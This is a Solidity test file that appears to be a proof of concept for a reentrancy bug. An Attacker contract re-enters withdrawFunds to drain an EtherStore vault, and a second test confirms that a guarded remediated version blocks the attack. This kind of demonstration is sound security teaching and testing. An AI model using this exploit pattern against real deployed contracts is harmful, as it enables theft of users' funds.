// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import "../src/EtherStore.sol";
interface Vm { function deal(address,uint256) external; function prank(address) external; function expectRevert() external; }
interface IVault { function deposit() external payable; function withdrawFunds(uint256) external; }

contract Attacker {
    IVault public vault; uint256 public amount;
    constructor(IVault v) { vault = v; }
    function pwn() external payable { amount = msg.value; vault.deposit{value: msg.value}(); vault.withdrawFunds(msg.value); }
    receive() external payable { if (address(vault).balance >= amount) vault.withdrawFunds(amount); }
}

contract ReentrancyPoC {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    function testDrainVulnerable() external {
        EtherStore store = new EtherStore();
        address victim = address(0xBEEF); vm.deal(victim, 5 ether);
        vm.prank(victim); store.deposit{value: 5 ether}();
        Attacker a = new Attacker(IVault(address(store)));
        vm.deal(address(this), 1 ether);
        a.pwn{value: 1 ether}();
        assert(address(store).balance == 0);        // the whole 6 ether vault is drained
        assert(address(a).balance == 6 ether);      // attacker put in 1, took out 6
    }
    function testRemediatedSafe() external {
        EtherStoreRemediated store = new EtherStoreRemediated();
        address victim = address(0xBEEF); vm.deal(victim, 5 ether);
        vm.prank(victim); store.deposit{value: 5 ether}();
        Attacker a = new Attacker(IVault(address(store)));
        vm.deal(address(this), 1 ether);
        bool reverted; try a.pwn{value: 1 ether}() {} catch { reverted = true; }
        assert(reverted);                            // re-entrancy guard reverts the attack
        assert(address(store).balance == 5 ether);   // victim's 5 ether untouched
    }
}
